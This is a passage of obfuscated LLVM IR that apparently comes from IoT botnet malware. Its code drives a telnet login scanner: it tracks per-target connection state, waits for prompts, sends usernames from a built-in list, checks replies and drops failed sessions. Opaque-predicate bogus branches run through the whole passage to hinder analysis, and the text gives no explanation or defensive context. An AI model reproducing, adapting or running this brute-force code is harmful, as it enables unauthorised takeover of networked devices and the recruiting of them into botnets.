  %787 = call i8* @strstr(i8* %786, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %788 = icmp ne i8* %787, null
  %789 = load i32, i32* @x.69
  %790 = load i32, i32* @y.70
  %791 = sub i32 %789, 1
  %792 = mul i32 %789, %791
  %793 = urem i32 %792, 2
  %794 = icmp eq i32 %793, 0
  %795 = icmp slt i32 %790, 10
  %796 = or i1 %794, %795
  br i1 %796, label %originalBBpart2127, label %originalBB125alteredBB

originalBBpart2127:                               ; preds = %originalBB125
  br i1 %788, label %797, label %802

; <label>:797:                                    ; preds = %originalBBpart2127
  %798 = load i32, i32* %2, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %799
  %801 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %800, i32 0, i32 2
  store i8 5, i8* %801, align 8
  br label %808

; <label>:802:                                    ; preds = %originalBBpart2127
  %803 = load i32, i32* %2, align 4
  %804 = sext i32 %803 to i64
  %805 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %804
  %806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %805, i32 0, i32 8
  %807 = load i8*, i8** %806, align 8
  call void @llvm.memset.p0i8.i64(i8* %807, i8 0, i64 1024, i32 1, i1 false)
  br label %808

; <label>:808:                                    ; preds = %802, %797
  %809 = load i32, i32* %2, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 2
  store i8 3, i8* %812, align 8
  br label %3224

; <label>:813:                                    ; preds = %746
  %814 = load i32, i32* @x.69
  %815 = load i32, i32* @y.70
  %816 = sub i32 %814, 1
  %817 = mul i32 %814, %816
  %818 = urem i32 %817, 2
  %819 = icmp eq i32 %818, 0
  %820 = icmp slt i32 %815, 10
  %821 = or i1 %819, %820
  br i1 %821, label %originalBB129, label %originalBB129alteredBB

originalBB129:                                    ; preds = %originalBB129alteredBB, %813
  %822 = load i32, i32* %2, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %823
  %825 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %824, i32 0, i32 0
  %826 = load i32, i32* %825, align 16
  %827 = load i32, i32* %2, align 4
  %828 = sext i32 %827 to i64
  %829 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %828
  %830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %829, i32 0, i32 8
  %831 = load i8*, i8** %830, align 8
  %832 = load i32, i32* %2, align 4
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %833
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %834, i32 0, i32 7
  %836 = load i16, i16* %835, align 16
  %837 = zext i16 %836 to i32
  %838 = call i32 @readUntil(i32 %826, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %831, i32 1024, i32 %837)
  %839 = icmp ne i32 %838, 0
  %840 = load i32, i32* @x.69
  %841 = load i32, i32* @y.70
  %842 = sub i32 %840, 1
  %843 = mul i32 %840, %842
  %844 = urem i32 %843, 2
  %845 = icmp eq i32 %844, 0
  %846 = icmp slt i32 %841, 10
  %847 = or i1 %845, %846
  br i1 %847, label %originalBBpart2131, label %originalBB129alteredBB

originalBBpart2131:                               ; preds = %originalBB129
  br i1 %839, label %848, label %912

; <label>:848:                                    ; preds = %originalBBpart2131
  %849 = load i32, i32* @x.69
  %850 = load i32, i32* @y.70
  %851 = sub i32 %849, 1
  %852 = mul i32 %849, %851
  %853 = urem i32 %852, 2
  %854 = icmp eq i32 %853, 0
  %855 = icmp slt i32 %850, 10
  %856 = or i1 %854, %855
  br i1 %856, label %originalBB133, label %originalBB133alteredBB

originalBB133:                                    ; preds = %originalBB133alteredBB, %848
  %857 = load i32, i32* %2, align 4
  %858 = sext i32 %857 to i64
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 6
  store i32 0, i32* %860, align 4
  %861 = load i32, i32* %2, align 4
  %862 = sext i32 %861 to i64
  %863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %862
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %863, i32 0, i32 7
  store i16 0, i16* %864, align 16
  %865 = load i32, i32* %2, align 4
  %866 = sext i32 %865 to i64
  %867 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %866
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %867, i32 0, i32 8
  %869 = load i8*, i8** %868, align 8
  %870 = call i8* @strstr(i8* %869, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %871 = icmp ne i8* %870, null
  %872 = load i32, i32* @x.69
  %873 = load i32, i32* @y.70
  %874 = sub i32 %872, 1
  %875 = mul i32 %872, %874
  %876 = urem i32 %875, 2
  %877 = icmp eq i32 %876, 0
  %878 = icmp slt i32 %873, 10
  %879 = or i1 %877, %878
  br i1 %879, label %originalBBpart2135, label %originalBB133alteredBB

originalBBpart2135:                               ; preds = %originalBB133
  br i1 %871, label %880, label %885

; <label>:880:                                    ; preds = %originalBBpart2135
  %881 = load i32, i32* %2, align 4
  %882 = sext i32 %881 to i64
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %882
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %883, i32 0, i32 2
  store i8 5, i8* %884, align 8
  br label %907

; <label>:885:                                    ; preds = %originalBBpart2135
  %886 = load i32, i32* @x.69
  %887 = load i32, i32* @y.70
  %888 = sub i32 %886, 1
  %889 = mul i32 %886, %888
  %890 = urem i32 %889, 2
  %891 = icmp eq i32 %890, 0
  %892 = icmp slt i32 %887, 10
  %893 = or i1 %891, %892
  br i1 %893, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %885
  %894 = load i32, i32* %2, align 4
  %895 = sext i32 %894 to i64
  %896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %895
  %897 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %896, i32 0, i32 8
  %898 = load i8*, i8** %897, align 8
  call void @llvm.memset.p0i8.i64(i8* %898, i8 0, i64 1024, i32 1, i1 false)
  %899 = load i32, i32* @x.69
  %900 = load i32, i32* @y.70
  %901 = sub i32 %899, 1
  %902 = mul i32 %899, %901
  %903 = urem i32 %902, 2
  %904 = icmp eq i32 %903, 0
  %905 = icmp slt i32 %900, 10
  %906 = or i1 %904, %905
  br i1 %906, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %907

; <label>:907:                                    ; preds = %originalBBpart2139, %880
  %908 = load i32, i32* %2, align 4
  %909 = sext i32 %908 to i64
  %910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %909
  %911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %910, i32 0, i32 2
  store i8 3, i8* %911, align 8
  br label %3224

; <label>:912:                                    ; preds = %originalBBpart2131
  %913 = load i32, i32* @x.69
  %914 = load i32, i32* @y.70
  %915 = sub i32 %913, 1
  %916 = mul i32 %913, %915
  %917 = urem i32 %916, 2
  %918 = icmp eq i32 %917, 0
  %919 = icmp slt i32 %914, 10
  %920 = or i1 %918, %919
  br i1 %920, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %912
  %921 = load i32, i32* %2, align 4
  %922 = sext i32 %921 to i64
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %922
  %924 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %923, i32 0, i32 0
  %925 = load i32, i32* %924, align 16
  %926 = load i32, i32* %2, align 4
  %927 = sext i32 %926 to i64
  %928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %927
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %928, i32 0, i32 8
  %930 = load i8*, i8** %929, align 8
  %931 = load i32, i32* %2, align 4
  %932 = sext i32 %931 to i64
  %933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %932
  %934 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %933, i32 0, i32 7
  %935 = load i16, i16* %934, align 16
  %936 = zext i16 %935 to i32
  %937 = call i32 @readUntil(i32 %925, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 0, i32 0, i32 10000, i8* %930, i32 1024, i32 %936)
  %938 = icmp ne i32 %937, 0
  %939 = load i32, i32* @x.69
  %940 = load i32, i32* @y.70
  %941 = sub i32 %939, 1
  %942 = mul i32 %939, %941
  %943 = urem i32 %942, 2
  %944 = icmp eq i32 %943, 0
  %945 = icmp slt i32 %940, 10
  %946 = or i1 %944, %945
  br i1 %946, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br i1 %938, label %947, label %979

; <label>:947:                                    ; preds = %originalBBpart2143
  %948 = load i32, i32* %2, align 4
  %949 = sext i32 %948 to i64
  %950 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %949
  %951 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %950, i32 0, i32 6
  store i32 0, i32* %951, align 4
  %952 = load i32, i32* %2, align 4
  %953 = sext i32 %952 to i64
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %953
  %955 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %954, i32 0, i32 7
  store i16 0, i16* %955, align 16
  %956 = load i32, i32* %2, align 4
  %957 = sext i32 %956 to i64
  %958 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %957
  %959 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %958, i32 0, i32 8
  %960 = load i8*, i8** %959, align 8
  %961 = call i8* @strstr(i8* %960, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0)) #10
  %962 = icmp ne i8* %961, null
  br i1 %962, label %963, label %968

; <label>:963:                                    ; preds = %947
  %964 = load i32, i32* %2, align 4
  %965 = sext i32 %964 to i64
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 2
  store i8 5, i8* %967, align 8
  br label %974

; <label>:968:                                    ; preds = %947
  %969 = load i32, i32* %2, align 4
  %970 = sext i32 %969 to i64
  %971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %970
  %972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %971, i32 0, i32 8
  %973 = load i8*, i8** %972, align 8
  call void @llvm.memset.p0i8.i64(i8* %973, i8 0, i64 1024, i32 1, i1 false)
  br label %974

; <label>:974:                                    ; preds = %968, %963
  %975 = load i32, i32* %2, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %976
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %977, i32 0, i32 2
  store i8 3, i8* %978, align 8
  br label %3224

; <label>:979:                                    ; preds = %originalBBpart2143
  %980 = load i32, i32* @x.69
  %981 = load i32, i32* @y.70
  %982 = sub i32 %980, 1
  %983 = mul i32 %980, %982
  %984 = urem i32 %983, 2
  %985 = icmp eq i32 %984, 0
  %986 = icmp slt i32 %981, 10
  %987 = or i1 %985, %986
  br i1 %987, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %979
  %988 = load i32, i32* %2, align 4
  %989 = sext i32 %988 to i64
  %990 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %989
  %991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %990, i32 0, i32 8
  %992 = load i8*, i8** %991, align 8
  %993 = call i64 @strlen(i8* %992) #10
  %994 = trunc i64 %993 to i16
  %995 = load i32, i32* %2, align 4
  %996 = sext i32 %995 to i64
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %996
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %997, i32 0, i32 7
  store i16 %994, i16* %998, align 16
  %999 = load i32, i32* @x.69
  %1000 = load i32, i32* @y.70
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBBpart2147, label %originalBB145alteredBB

originalBBpart2147:                               ; preds = %originalBB145
  br label %1007

; <label>:1007:                                   ; preds = %originalBBpart2147
  br label %1008

; <label>:1008:                                   ; preds = %1007
  %1009 = load i32, i32* @x.69
  %1010 = load i32, i32* @y.70
  %1011 = sub i32 %1009, 1
  %1012 = mul i32 %1009, %1011
  %1013 = urem i32 %1012, 2
  %1014 = icmp eq i32 %1013, 0
  %1015 = icmp slt i32 %1010, 10
  %1016 = or i1 %1014, %1015
  br i1 %1016, label %originalBB149, label %originalBB149alteredBB

originalBB149:                                    ; preds = %originalBB149alteredBB, %1008
  %1017 = load i32, i32* @x.69
  %1018 = load i32, i32* @y.70
  %1019 = sub i32 %1017, 1
  %1020 = mul i32 %1017, %1019
  %1021 = urem i32 %1020, 2
  %1022 = icmp eq i32 %1021, 0
  %1023 = icmp slt i32 %1018, 10
  %1024 = or i1 %1022, %1023
  br i1 %1024, label %originalBBpart2151, label %originalBB149alteredBB

originalBBpart2151:                               ; preds = %originalBB149
  br label %1025

; <label>:1025:                                   ; preds = %originalBBpart2151
  br label %1026

; <label>:1026:                                   ; preds = %1025
  br label %1027

; <label>:1027:                                   ; preds = %1026
  %1028 = load i32, i32* @x.69
  %1029 = load i32, i32* @y.70
  %1030 = sub i32 %1028, 1
  %1031 = mul i32 %1028, %1030
  %1032 = urem i32 %1031, 2
  %1033 = icmp eq i32 %1032, 0
  %1034 = icmp slt i32 %1029, 10
  %1035 = or i1 %1033, %1034
  br i1 %1035, label %originalBB153, label %originalBB153alteredBB

originalBB153:                                    ; preds = %originalBB153alteredBB, %1027
  %1036 = load i32, i32* %2, align 4
  %1037 = sext i32 %1036 to i64
  %1038 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1037
  %1039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1038, i32 0, i32 6
  %1040 = load i32, i32* %1039, align 4
  %1041 = add i32 %1040, 10
  %1042 = zext i32 %1041 to i64
  %1043 = call i64 @time(i64* null) #2
  %1044 = icmp slt i64 %1042, %1043
  %1045 = load i32, i32* @x.69
  %1046 = load i32, i32* @y.70
  %1047 = sub i32 %1045, 1
  %1048 = mul i32 %1045, %1047
  %1049 = urem i32 %1048, 2
  %1050 = icmp eq i32 %1049, 0
  %1051 = icmp slt i32 %1046, 10
  %1052 = or i1 %1050, %1051
  br i1 %1052, label %originalBBpart2165, label %originalBB153alteredBB

originalBBpart2165:                               ; preds = %originalBB153
  br i1 %1044, label %1053, label %1068

; <label>:1053:                                   ; preds = %originalBBpart2165
  %1054 = load i32, i32* %2, align 4
  %1055 = sext i32 %1054 to i64
  %1056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1055
  %1057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1056, i32 0, i32 0
  %1058 = load i32, i32* %1057, align 16
  %1059 = call i32 @sclose(i32 %1058)
  %1060 = load i32, i32* %2, align 4
  %1061 = sext i32 %1060 to i64
  %1062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1061
  %1063 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1062, i32 0, i32 2
  store i8 0, i8* %1063, align 8
  %1064 = load i32, i32* %2, align 4
  %1065 = sext i32 %1064 to i64
  %1066 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1065
  %1067 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1066, i32 0, i32 3
  store i8 1, i8* %1067, align 1
  br label %1068

; <label>:1068:                                   ; preds = %1053, %originalBBpart2165
  br label %3223

; <label>:1069:                                   ; preds = %84
  %1070 = load i32, i32* %2, align 4
  %1071 = sext i32 %1070 to i64
  %1072 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1071
  %1073 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1072, i32 0, i32 0
  %1074 = load i32, i32* %1073, align 16
  %1075 = load i32, i32* %2, align 4
  %1076 = sext i32 %1075 to i64
  %1077 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1076
  %1078 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1077, i32 0, i32 4
  %1079 = load i8, i8* %1078, align 2
  %1080 = zext i8 %1079 to i64
  %1081 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1080
  %1082 = load i8*, i8** %1081, align 8
  %1083 = load i32, i32* %2, align 4
  %1084 = sext i32 %1083 to i64
  %1085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1084
  %1086 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1085, i32 0, i32 4
  %1087 = load i8, i8* %1086, align 2
  %1088 = zext i8 %1087 to i64
  %1089 = getelementptr inbounds [4 x i8*], [4 x i8*]* @usernames, i64 0, i64 %1088
  %1090 = load i8*, i8** %1089, align 8
  %1091 = call i64 @strlen(i8* %1090) #10
  %1092 = call i64 @send(i32 %1074, i8* %1082, i64 %1091, i32 16384)
  %1093 = icmp slt i64 %1092, 0
  br i1 %1093, label %1094, label %1125

; <label>:1094:                                   ; preds = %1069
  %1095 = load i32, i32* @x.69
  %1096 = load i32, i32* @y.70
  %1097 = sub i32 %1095, 1
  %1098 = mul i32 %1095, %1097
  %1099 = urem i32 %1098, 2
  %1100 = icmp eq i32 %1099, 0
  %1101 = icmp slt i32 %1096, 10
  %1102 = or i1 %1100, %1101
  br i1 %1102, label %originalBB167, label %originalBB167alteredBB

originalBB167:                                    ; preds = %originalBB167alteredBB, %1094
  %1103 = load i32, i32* %2, align 4
  %1104 = sext i32 %1103 to i64
  %1105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1104
  %1106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1105, i32 0, i32 0
  %1107 = load i32, i32* %1106, align 16
  %1108 = call i32 @sclose(i32 %1107)
  %1109 = load i32, i32* %2, align 4
  %1110 = sext i32 %1109 to i64
  %1111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1110
  %1112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1111, i32 0, i32 2
  store i8 0, i8* %1112, align 8
  %1113 = load i32, i32* %2, align 4
  %1114 = sext i32 %1113 to i64
  %1115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1114
  %1116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1115, i32 0, i32 3
  store i8 1, i8* %1116, align 1
  %1117 = load i32, i32* @x.69
  %1118 = load i32, i32* @y.70
  %1119 = sub i32 %1117, 1
  %1120 = mul i32 %1117, %1119
  %1121 = urem i32 %1120, 2
  %1122 = icmp eq i32 %1121, 0
  %1123 = icmp slt i32 %1118, 10
  %1124 = or i1 %1122, %1123
  br i1 %1124, label %originalBBpart2169, label %originalBB167alteredBB

originalBBpart2169:                               ; preds = %originalBB167
  br label %3224

; <label>:1125:                                   ; preds = %1069
  %1126 = load i32, i32* %2, align 4
  %1127 = sext i32 %1126 to i64
  %1128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1127
  %1129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1128, i32 0, i32 0
  %1130 = load i32, i32* %1129, align 16
  %1131 = call i64 @send(i32 %1130, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.62, i32 0, i32 0), i64 2, i32 16384)
  %1132 = icmp slt i64 %1131, 0
  br i1 %1132, label %1133, label %1164

; <label>:1133:                                   ; preds = %1125
  %1134 = load i32, i32* @x.69
  %1135 = load i32, i32* @y.70
  %1136 = sub i32 %1134, 1
  %1137 = mul i32 %1134, %1136
  %1138 = urem i32 %1137, 2
  %1139 = icmp eq i32 %1138, 0
  %1140 = icmp slt i32 %1135, 10
  %1141 = or i1 %1139, %1140
  br i1 %1141, label %originalBB171, label %originalBB171alteredBB

originalBB171:                                    ; preds = %originalBB171alteredBB, %1133
  %1142 = load i32, i32* %2, align 4
  %1143 = sext i32 %1142 to i64
  %1144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1143
  %1145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1144, i32 0, i32 0
  %1146 = load i32, i32* %1145, align 16
  %1147 = call i32 @sclose(i32 %1146)
  %1148 = load i32, i32* %2, align 4
  %1149 = sext i32 %1148 to i64
  %1150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1149
  %1151 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1150, i32 0, i32 2
  store i8 0, i8* %1151, align 8
  %1152 = load i32, i32* %2, align 4
  %1153 = sext i32 %1152 to i64
  %1154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1153
  %1155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1154, i32 0, i32 3
  store i8 1, i8* %1155, align 1
  %1156 = load i32, i32* @x.69
  %1157 = load i32, i32* @y.70
  %1158 = sub i32 %1156, 1
  %1159 = mul i32 %1156, %1158
  %1160 = urem i32 %1159, 2
  %1161 = icmp eq i32 %1160, 0
  %1162 = icmp slt i32 %1157, 10
  %1163 = or i1 %1161, %1162
  br i1 %1163, label %originalBBpart2173, label %originalBB171alteredBB

originalBBpart2173:                               ; preds = %originalBB171
  br label %3224

; <label>:1164:                                   ; preds = %1125
  %1165 = load i32, i32* %2, align 4
  %1166 = sext i32 %1165 to i64
  %1167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1166
  %1168 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1167, i32 0, i32 2
  store i8 4, i8* %1168, align 8
  br label %3223

; <label>:1169:                                   ; preds = %84
  %1170 = load i32, i32* @x.69
  %1171 = load i32, i32* @y.70
  %1172 = sub i32 %1170, 1
  %1173 = mul i32 %1170, %1172
  %1174 = urem i32 %1173, 2
  %1175 = icmp eq i32 %1174, 0
  %1176 = icmp slt i32 %1171, 10
  %1177 = or i1 %1175, %1176
  br i1 %1177, label %originalBB175, label %originalBB175alteredBB

originalBB175:                                    ; preds = %originalBB175alteredBB, %1169
  %1178 = load i32, i32* %2, align 4
  %1179 = sext i32 %1178 to i64
  %1180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1179
  %1181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1180, i32 0, i32 6
  %1182 = load i32, i32* %1181, align 4
  %1183 = icmp eq i32 %1182, 0
  %1184 = load i32, i32* @x.69
  %1185 = load i32, i32* @y.70
  %1186 = sub i32 %1184, 1
  %1187 = mul i32 %1184, %1186
  %1188 = urem i32 %1187, 2
  %1189 = icmp eq i32 %1188, 0
  %1190 = icmp slt i32 %1185, 10
  %1191 = or i1 %1189, %1190
  br i1 %1191, label %originalBBpart2177, label %originalBB175alteredBB

originalBBpart2177:                               ; preds = %originalBB175
  br i1 %1183, label %1192, label %1199

; <label>:1192:                                   ; preds = %originalBBpart2177
  %1193 = call i64 @time(i64* null) #2
  %1194 = trunc i64 %1193 to i32
  %1195 = load i32, i32* %2, align 4
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1196
  %1198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1197, i32 0, i32 6
  store i32 %1194, i32* %1198, align 4
  br label %1199

; <label>:1199:                                   ; preds = %1192, %originalBBpart2177
  %1200 = load i32, i32* %2, align 4
  %1201 = sext i32 %1200 to i64
  %1202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1201
  %1203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1202, i32 0, i32 0
  %1204 = load i32, i32* %1203, align 16
  %1205 = load i32, i32* %2, align 4
  %1206 = sext i32 %1205 to i64
  %1207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1206
  %1208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1207, i32 0, i32 8
  %1209 = load i8*, i8** %1208, align 8
  %1210 = load i32, i32* %2, align 4
  %1211 = sext i32 %1210 to i64
  %1212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1211
  %1213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1212, i32 0, i32 7
  %1214 = load i16, i16* %1213, align 16
  %1215 = zext i16 %1214 to i32
  %1216 = call i32 @readUntil(i32 %1204, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1209, i32 1024, i32 %1215)
  %1217 = icmp ne i32 %1216, 0
  br i1 %1217, label %1218, label %1250

; <label>:1218:                                   ; preds = %1199
  %1219 = load i32, i32* %2, align 4
  %1220 = sext i32 %1219 to i64
  %1221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1220
  %1222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1221, i32 0, i32 6
  store i32 0, i32* %1222, align 4
  %1223 = load i32, i32* %2, align 4
  %1224 = sext i32 %1223 to i64
  %1225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1224
  %1226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1225, i32 0, i32 7
  store i16 0, i16* %1226, align 16
  %1227 = load i32, i32* %2, align 4
  %1228 = sext i32 %1227 to i64
  %1229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1228
  %1230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1229, i32 0, i32 8
  %1231 = load i8*, i8** %1230, align 8
  %1232 = call i8* @strstr(i8* %1231, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i32 0, i32 0)) #10
  %1233 = icmp ne i8* %1232, null
  br i1 %1233, label %1234, label %1239

; <label>:1234:                                   ; preds = %1218
  %1235 = load i32, i32* %2, align 4
  %1236 = sext i32 %1235 to i64
  %1237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1236
  %1238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1237, i32 0, i32 2
  store i8 5, i8* %1238, align 8
  br label %1244

; <label>:1239:                                   ; preds = %1218
  %1240 = load i32, i32* %2, align 4
  %1241 = sext i32 %1240 to i64
  %1242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1241
  %1243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1242, i32 0, i32 2
  store i8 7, i8* %1243, align 8
  br label %1244

; <label>:1244:                                   ; preds = %1239, %1234
  %1245 = load i32, i32* %2, align 4
  %1246 = sext i32 %1245 to i64
  %1247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1246
  %1248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1247, i32 0, i32 8
  %1249 = load i8*, i8** %1248, align 8
  call void @llvm.memset.p0i8.i64(i8* %1249, i8 0, i64 1024, i32 1, i1 false)
  br label %3224

; <label>:1250:                                   ; preds = %1199
  %1251 = load i32, i32* %2, align 4
  %1252 = sext i32 %1251 to i64
  %1253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1252
  %1254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1253, i32 0, i32 0
  %1255 = load i32, i32* %1254, align 16
  %1256 = load i32, i32* %2, align 4
  %1257 = sext i32 %1256 to i64
  %1258 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1257
  %1259 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1258, i32 0, i32 8
  %1260 = load i8*, i8** %1259, align 8
  %1261 = load i32, i32* %2, align 4
  %1262 = sext i32 %1261 to i64
  %1263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1262
  %1264 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1263, i32 0, i32 7
  %1265 = load i16, i16* %1264, align 16
  %1266 = zext i16 %1265 to i32
  %1267 = call i32 @readUntil(i32 %1255, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.61, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1260, i32 1024, i32 %1266)
  %1268 = icmp ne i32 %1267, 0
  br i1 %1268, label %1269, label %1317

; <label>:1269:                                   ; preds = %1250
  %1270 = load i32, i32* %2, align 4
  %1271 = sext i32 %1270 to i64
  %1272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1271
  %1273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1272, i32 0, i32 6
  store i32 0, i32* %1273, align 4
